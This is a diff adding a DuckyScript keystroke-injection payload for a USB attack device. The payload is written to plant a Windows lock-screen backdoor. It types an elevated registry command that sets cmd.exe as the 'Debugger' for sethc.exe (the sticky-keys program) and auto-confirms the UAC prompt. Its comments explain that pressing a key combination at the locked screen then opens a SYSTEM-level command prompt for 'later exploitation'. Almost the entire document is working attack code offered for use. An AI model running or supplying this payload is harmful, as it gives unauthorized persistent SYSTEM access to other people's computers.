@@ -1,0 +1,14 @@
+REM Ability to attack from the lock screen as system. Please note that this is a setup for later exploitation when the computer is locked.
+REM After that has been executed on the system, when at the lock screen you have your payloads enter: Left Alt + Left Shift + Print Screen
+You'll now have a SYSTEM user level command prompt which can run powershell, create vbs/batch scripts, auto starts whatever.
+
+DELAY 400
+ESCAPE
+DELAY 200
+CONTROL ESCAPE
+DELAY 750
+STRING cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
+DELAY 750
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
